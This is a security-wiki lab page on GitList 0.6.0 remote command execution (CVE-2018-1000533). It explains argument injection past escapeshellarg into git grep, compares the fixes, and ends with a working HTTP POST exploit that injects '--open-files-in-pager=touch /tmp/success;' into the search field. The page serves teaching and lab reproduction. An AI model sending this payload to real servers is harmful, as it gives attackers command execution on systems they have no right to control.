<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Gitlist/CVE-2018-1000533/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>GitList 0.6.0 Remote Command Execution (CVE-2018-1000533) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "GitList 0.6.0 Remote Command Execution (CVE-2018-1000533)", url: "#_top", children: [
              {title: "Vulnerable environment", url: "#vulnerable-environment" },
              {title: "Vulnerability Principle", url: "#vulnerability-principle" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../0.6.0-rce/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../0.6.0-rce/" class="btn btn-xs btn-link">
        redirect to gitlist/CVE-2018-1000533
      </a>
    </div>
    
  </div>

    

    <h1 id="gitlist-060-remote-command-execution-cve-2018-1000533">GitList 0.6.0 Remote Command Execution (CVE-2018-1000533)<a class="headerlink" href="#gitlist-060-remote-command-execution-cve-2018-1000533" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>GitList is an elegant and modern git repository viewer.</p>
<p>GitList version &lt;= 0.6 contains a passing incorrectly sanitized input to system function vulnerability in <code>searchTree</code> function that can result in executing arbitrary commands as PHP user. This attack appear to be exploitable via POST request using search form.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322">https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a></li>
<li><a href="https://www.exploit-db.com/exploits/44548">https://www.exploit-db.com/exploits/44548</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute following command to start a GitList server 0.6.0:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, browse the <code>http://your-ip:8080</code> and you will see a repository named <code>example</code>.</p>
<h2 id="vulnerability-principle">Vulnerability Principle<a class="headerlink" href="#vulnerability-principle" title="Permanent link">&para;</a></h2>
<p>GitList uses <code>git grep</code> while searching code in repository:</p>
<div class="highlight"><pre><span></span><code><span class="x">public function searchTree($query, $branch)</span>
<span class="x">{</span>
<span class="x">    if (empty($query)) {</span>
<span class="x">        return null;</span>
<span class="x">    }</span>

<span class="x">    $query = escapeshellarg($query);</span>

<span class="x">    try {</span>
<span class="x">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);</span>
<span class="x">    } catch (\RuntimeException $e) {</span>
<span class="x">        return false;</span>
<span class="x">    }</span>
</code></pre></div>
<p><code>$query</code> is the search keyword, <code>$branch</code> is the target branch.</p>
<p><code>id</code> will be executed if attacker passed <code>--open-files-in-pager=id;</code> as the <code>$query</code>'s value:</p>
<p><img alt="" src="img/1.png" /></p>
<p>There are two reasons for this vulnerability:</p>
<ol>
<li>Misunderstanding of the <code>escapeshellarg</code> function, resulting in arguments injection</li>
<li>The value of the <code>--open-files-in-pager</code> argument of <code>git grep</code>, which will be directly executed</li>
</ol>
<p>Theoretically, after <code>$query = escapeshellarg($query);</code>, <code>$query</code> will become a string wrapped in single quotes. The premise of the bug is that the string should appear in the “parameter value” position, not in the parameter option.</p>
<p>To fix this issue, we can put the <code>$query</code> option behind <code>-e</code>:</p>
<div class="highlight"><pre><span></span><code>git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master
</code></pre></div>
<p><img alt="" src="img/2.png" /></p>
<p>This is the suggestion from Git official:</p>
<blockquote>
<p>-e
The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by
or.</p>
</blockquote>
<p>GitList used another fix:</p>
<div class="highlight"><pre><span></span><code><span class="x">public function searchTree($query, $branch)</span>
<span class="x">{</span>
<span class="x">    if (empty($query)) {</span>
<span class="x">        return null;</span>
<span class="x">    }</span>
<span class="x">    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);</span>
<span class="x">    $query = escapeshellarg($query);</span>
<span class="x">    try {</span>
<span class="x">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);</span>
<span class="x">    } catch (\RuntimeException $e) {</span>
<span class="x">        return false;</span>
<span class="x">    }</span>
</code></pre></div>
<p>Firstly, remove illegal <code>-</code> prefix from <code>$query</code>, then put it behind <code>--</code>. The double-dash (<code>--</code>) will be accepted as a delimiter indicating the end of options in command line.</p>
<blockquote>
<p>A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.</p>
<p>If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash's exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.</p>
</blockquote>
<p>So this this patch is acceptable, except that the <code>preg_replace</code> in the first step affects the normal search function.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>Send following request:</p>
<div class="highlight"><pre><span></span><code>POST /example/tree/a/search HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Content-Length: 56

query=--open-files-in-pager=touch /tmp/success;
</code></pre></div>
<p>Noted that there are two arguments in URL: <code>/[repo_name]/tree/[keyword]/search</code>. <code>[repo_name]</code> must be a existing repository in the GitList, <code>[keyword]</code> is a search keyword that produces at least one result.</p>
<p>After the request is sent, use <code>docker compose exec web bash</code> to enter the container and you can see that <code>/tmp/success</code> has been successfully created:</p>
<p><img alt="" src="img/4.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../0.6.0-rce/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../0.6.0-rce/" class="btn btn-xs btn-link">
        redirect to gitlist/CVE-2018-1000533
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>